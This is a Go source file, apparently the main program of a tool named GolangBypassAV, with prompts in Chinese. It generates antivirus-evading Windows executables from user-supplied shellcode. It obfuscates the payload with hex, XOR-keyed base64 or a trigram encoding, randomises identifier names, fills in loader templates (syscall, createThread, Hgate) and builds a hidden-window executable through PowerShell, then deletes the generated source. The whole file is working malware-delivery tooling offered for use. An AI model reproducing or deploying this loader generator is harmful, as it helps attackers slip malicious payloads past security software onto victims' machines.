package main

import (
	"GolangBypassAV/bagua"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	key          []byte
	keys         string
	keyName      string
	decodeName   string
	genName      string
	gd           string
	bbdataName   string
	shellCodeHex string
	shellcodeStr string
)

var path = "payload.bin"
var tmplMap = make(map[string]string)
var encodeMap = make(map[string]string)

var path1 string
var hide1 string
var gostrip1 string
var isRm1 string
var tpl string
var encode string
var hide = true
var gostrip bool
var isRm = true
var tmplVal = "syscall"
var encodeVal = "hex"

const tmplHelp = `
1. syscall
2. createThread
3. Hgate
`

const encodeHelp = `
1. hex
2. base64
3. bagua
`

var decodeMethod = `
import "encoding/base64"
func $getDeCode(string2 string) []byte {
	var $keyName []byte
	ss, _ := $encode$.DecodeString(string2)
	string2 = string(ss)
	var code []byte
	bydata := []byte(string2)
	for i := 0; i < len(bydata); i++ {
		code = append(code, bydata[i]^$keyName[0]^$keyName[1])
	}
	ssb, _ := $encode$.DecodeString(string(code))
	return ssb
}
`

var decodeMethod1 = `
func $getDeCode(code string) []byte {
	ssb, _ := $encode$.DecodeString(string(code))
	return ssb
}
`

var decodeMethod2 = `
import(
	"os"
	"strconv"
    "errors"
)

const (
	qian = "☰" 
	dui  = "☱" 
	li   = "☲"
	zhen = "☳"
	xun  = "☴"
	kan  = "☵"
	gen  = "☶"
	kun  = "☷"
)

var m2 = map[string][3]int{
	qian: {0, 0, 0},
	dui:  {0, 0, 1},
	li:   {0, 1, 0},
	zhen: {0, 1, 1},
	xun:  {1, 0, 0},
	kan:  {1, 0, 1},
	gen:  {1, 1, 0},
	kun:  {1, 1, 1},
}

func b8ToByte(b []int) byte {
	return byte(b[0]<<7 + b[1]<<6 + b[2]<<5 + b[3]<<4 + b[4]<<3 + b[5]<<2 + b[6]<<1 + b[7])
}

func decode(s string) ([]byte, error) {
	if s == "" {
		return nil, nil
	}

	sl := len(s)

	is := make([]int, sl)
	for i := 0; i < sl/3; i++ {
		b, ok := m2[s[i*3:i*3+3]]
		if !ok {
			return nil, errors.New("invalid string, cur: " + strconv.Itoa(i))
		}
		copy(is[i*3:i*3+3], b[:])
	}

	buf := make([]byte, sl/8)
	for i := 0; i < sl/8; i++ {
		buf[i] = b8ToByte(is[i*8 : i*8+8])
	}

	return buf, nil
}

func $getDeCode(s string) []byte {
	result, err := decode(s)
	if err != nil {
		fmt.Fprintln(os.Stderr, err.Error())
		os.Exit(1)
	}
	return result
}
`

func init() {
	fmt.Println("[*]初始化混淆参数")
	//初始化key
	key = getKey()
	//key变量名
	keyName = randString(5)
	//解码方法名
	decodeName = randString(6)
	//生成exe方法名
	genName = randString(6)
	//混淆方法名
	gd = randString(6)

	//base64变量
	bbdataName = randString(4)

	shellCodeHex = randString(4)

	tmplMap["1"] = "syscall"
	tmplMap["2"] = "createThread"
	tmplMap["3"] = "Hgate"

	encodeMap["1"] = "hex"
	encodeMap["2"] = "base64"
	encodeMap["3"] = "bagua"
}

func getKey() []byte {
	keys = randString(2)
	b := []byte(keys)
	return b
}

func randString(l int) string {
	str := "abcdefghijklmnopqrstuvwxyz_ASDFGJHKLIUYTREWCVBMNKLOIPZXAQ"
	bytes := []byte(str)
	result := []byte{}
	x := time.Now().UnixNano() * 6
	y := time.Now().UnixNano() * 4
	r := rand.New(rand.NewSource(x + y))
	time.Sleep(1000)
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ddd := string(result)
	fmt.Println(ddd)
	return ddd
}

func getBase64EnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]^key[0]^key[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func getHexEnCode(data []byte) string {
	/*	var shellcode []byte
		for i := 0; i < len(data); i++ {
			shellcode = append(shellcode, data[i]^key[0]^key[1])
		}*/
	return hex.EncodeToString(data)
}

func getBaguaEncode(data []byte) string {
	return bagua.Bagua_en(data)
}

func gen(code *string) {

	*code = strings.ReplaceAll(*code, "$method$", decodeMethod)

	if encodeVal == "hex" {
		*code = strings.ReplaceAll(*code, "\"encoding/base64\"", "")
	}
	if encodeVal == "base64" && tmplVal != "Hgate" {
		*code = strings.ReplaceAll(*code, "\"encoding/hex\"", "")
	}
	//payload
	*code = strings.ReplaceAll(*code, "$bdata", shellcodeStr)
	//payload名
	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
	*code = strings.ReplaceAll(*code, "$keyName", keyName)
	*code = strings.ReplaceAll(*code, "$keys", keys)
	*code = strings.ReplaceAll(*code, "$shellCodeHex", shellCodeHex)
	*code = strings.ReplaceAll(*code, "$gd", gd)
	//*code=strings.ReplaceAll(*code, "$gdNum", ss)
	*code = strings.ReplaceAll(*code, "$genEXE", genName)
	*code = strings.ReplaceAll(*code, "$getDeCode", decodeName)

}

func main() {

	var m bool
	if len(os.Args) == 2 {
		fp := os.Args[1]
		_, err := os.Stat(fp)
		if err == nil {
			m = true
		}
	}

	//高级模式
	if !m {
		fmt.Println("[*]请输入shellcode路径 [默认./payload.bin]")
		fmt.Scanln(&path1)
		if strings.TrimSpace(path1) != "" {
			path = path1
		}
		fmt.Println("[*]请选择免杀方式 [默认1]")
		fmt.Println(tmplHelp)
		fmt.Scanln(&tpl)
		if strings.TrimSpace(tmplMap[tpl]) != "" {
			tmplVal = tmplMap[tpl]
		}

		fmt.Println("[*]请选择编码方式 [默认1]")
		fmt.Println(encodeHelp)
		fmt.Scanln(&encode)
		if strings.TrimSpace(encodeMap[encode]) != "" {
			encodeVal = encodeMap[encode]
		}

		fmt.Println("[*]是否隐藏窗口? [Y/n]")
		fmt.Scanln(&hide1)
		if hide1 == "n" {
			hide = false
		}

		/*		fmt.Println("[*]是否去除golang特征? [y/N]")
				fmt.Scanln(&gostrip1)
				if gostrip1 == "y" {
					gostrip = true
				}*/

		fmt.Println("[*]是否删除生成shellcode? [Y/n]")
		fmt.Scanln(&isRm1)
		if isRm1 == "n" {
			isRm = false
		}

		fmt.Println("===============================")

		time.Sleep(1 * time.Second)

	}
	sc, err := ioutil.ReadFile(path)
	if err != nil || len(sc) == 0 {
		fmt.Println("[-]请检查输入shellcode路径!")
		return
	}

	//根据编码生成shellcode
	if encodeVal == "hex" {
		shellcodeStr = getHexEnCode(sc)
		decodeMethod = decodeMethod1
		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "hex")
	}
	if encodeVal == "base64" {
		shellcodeStr = getBase64EnCode(sc)
		decodeMethod = strings.ReplaceAll(decodeMethod, "$encode$", "base64.StdEncoding")
	}
	if encodeVal == "bagua" {
		shellcodeStr = getBaguaEncode(sc)
		decodeMethod = decodeMethod2

	}

	fmt.Println("[+]获取payload", "---->", path)
	//fmt.Println(bdata)
	time.Sleep(1 * time.Second)
	fmt.Println("[*]编码方式", "---->", encodeVal)
	time.Sleep(1 * time.Second)
	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
	fmt.Println("[*]解析shellcode模板", "---->", tmplVal)
	time.Sleep(1 * time.Second)
	//tmpl, _ := ioutil.ReadFile("./syscal")
	tmpl, _ := ioutil.ReadFile("template/" + tmplVal)
	fmt.Println(tmpl)
	code := string(tmpl)
	fmt.Println("[*]生成shellcode", "---->shellcode.go")
	time.Sleep(1 * time.Second)

	gen(&code)
	ioutil.WriteFile("shellcode.go", []byte(code), 0666)

	fmt.Println("[*]编译shellcode")
	time.Sleep(1 * time.Second)

	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
	//隐藏窗口，如有需要自行替换
	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
	//CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go
	outFile := string(time.Now().Format("150405")) + ".exe"
	//outFile := "patch.exe"
	var cmd exec.Cmd
	if hide {
		//cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
		cmd = *exec.Command("powershell.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o "+outFile+" ./shellcode.go")
	} else {
		cmd = *exec.Command("powershell.exe", "/c", "go build -ldflags=-s -o "+outFile+" ./shellcode.go")
	}
	//阻塞至等待命令执行完成
	var out bytes.Buffer
	cmd.Stderr = &out
	err1 := cmd.Run()
	if err1 != nil {
		fmt.Println("error: ", out.String()) // 增加模板报错信息详情显示
		panic(err1)
	}
	fmt.Println("[+]生成文件" + outFile)
	if isRm {
		os.Remove("shellcode.go")
	}

}
